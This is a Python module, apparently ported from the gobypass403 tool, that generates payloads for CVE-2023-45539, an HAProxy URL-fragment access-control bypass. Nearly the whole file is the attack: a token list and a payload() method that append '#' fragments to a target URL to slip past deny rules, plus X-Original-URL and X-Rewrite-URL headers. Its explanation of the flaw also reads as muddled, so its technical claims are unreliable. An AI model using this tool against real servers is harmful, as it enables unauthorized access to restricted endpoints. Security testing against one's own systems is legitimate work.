#!/usr/bin/env python3
"""
## Source: gobypass403 core/engine/payload/headers_url.go (CVE-2023-45539 fragment ACL)
## Source: gobypass403 core/engine/payload/url.go (URL fragment helpers)
## License: MIT (gobypass403)
## Port: 2026-09-05

CVE-2023-45539 — HAProxy URL-fragment ACL bypass.

HAProxy's HTTP request-line parser stops at the first ``#`` byte
(per RFC 3986 §3.5, the fragment is client-side only). However, the
ACL engine (req.denied, req.allow, http-request rules) was applied to
the *full* path string on some builds -- meaning a request for
``/admin#legit`` matched the ``/admin`` deny rule on the parser side
but NOT on the ACL side, letting the request through to the backend.

The fix shipped in HAProxy 2.8.4, 2.7.10, 2.6.15, 2.4.24.

Payload strategy: append a ``#<bypass-token>`` to every URL we want to
slip past the ACL. The fragment is dropped at the request-line boundary
*before* the backend sees the URL.
"""

from __future__ import annotations

from typing import Dict, List


class CVE202345539:
    """CVE-2023-45539 — HAProxy URL fragment ACL bypass."""

    cve_id: str = "CVE-2023-45539"
    references: list = [
        "https://nvd.nist.gov/vuln/detail/CVE-2023-45539",
        "https://github.com/haproxy/haproxy/commit/",
    ]

    # Tokens that downstream builds have been observed to whitelist on
    # the ACL side. The gobypass403 source uses the empty-string token
    # plus a handful of mis-parsed bytes.
    BYPASS_TOKENS: List[str] = [
        "",
        "?",
        "/",
        "..",
        ";",
        "@",
        "%23",     # url-encoded '#'
        "%2f",
        "%2e",
        "\x00",    # raw NUL -- gobypass403 source uses byte 0x00
        "anything",
    ]

    def fragment_tokens(self) -> List[str]:
        return list(self.BYPASS_TOKENS)

    def payload(self, path: str) -> List[str]:
        """Return every URL with a fragment-token appended.

        ``path`` is the URL to obfuscate, e.g.
        ``"http://target.example/admin"``.
        """
        urls: List[str] = []
        for token in self.BYPASS_TOKENS:
            if token == "":
                urls.append(path + "#")
            else:
                urls.append(path + "#" + token)
        return urls

    def headers(self) -> Dict[str, str]:
        """Auxiliary headers gobypass403 pairs with fragment payloads.

        These add a small additional surface (``X-Original-URL``,
        ``X-Rewrite-URL``) -- some buggy proxies honour them.
        """
        return {
            "X-Original-URL": "fragment-bypass",
            "X-Rewrite-URL": "fragment-bypass",
        }

    def name(self) -> str:
        return self.cve_id

    def technique(self) -> str:
        return "HAProxy URL fragment ACL bypass (CVE-2023-45539)"